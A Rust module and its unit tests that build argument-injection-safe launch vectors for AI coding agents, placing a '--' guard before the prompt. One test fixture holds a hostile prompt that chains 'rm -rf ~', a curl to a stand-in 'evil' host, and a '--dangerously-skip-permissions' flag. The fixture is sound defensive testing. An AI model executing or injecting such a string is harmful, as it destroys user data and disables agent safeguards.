//! Builds argument-injection-safe agent launch vectors.

pub(super) struct LaunchArgv(Vec<String>);

impl LaunchArgv {
    pub(super) fn new(binary: &str) -> Self {
        Self(vec![binary.to_string()])
    }

    pub(super) fn flag(mut self, flag: &str, value: String) -> Self {
        self.0.push(flag.to_string());
        self.0.push(value);
        self
    }

    pub(super) fn into_guarded(mut self, prompt: String) -> Vec<String> {
        self.0.push("--".to_string());
        self.0.push(prompt);
        self.0
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn binary_only_then_guarded_caps_prompt_as_trailing_positional() {
        let argv = LaunchArgv::new("codex").into_guarded("do the thing".to_string());
        assert_eq!(argv, vec!["codex", "--", "do the thing"]);
    }

    #[test]
    fn flag_pairs_precede_the_guard() {
        let argv = LaunchArgv::new("claude")
            .flag("--name", "PWF-0001 - title".to_string())
            .into_guarded("prompt".to_string());
        assert_eq!(
            argv,
            vec!["claude", "--name", "PWF-0001 - title", "--", "prompt"]
        );
    }

    #[test]
    fn hostile_prompt_stays_one_inert_trailing_element() {
        let hostile = "; rm -rf ~ $(curl evil)\n--dangerously-skip-permissions";
        let argv = LaunchArgv::new("claude")
            .flag("--name", "PWF-0001 - x".to_string())
            .into_guarded(hostile.to_string());
        assert_eq!(argv[0], "claude");
        assert_eq!(argv[argv.len() - 2], "--");
        assert_eq!(argv.last().unwrap(), hostile);
    }
}
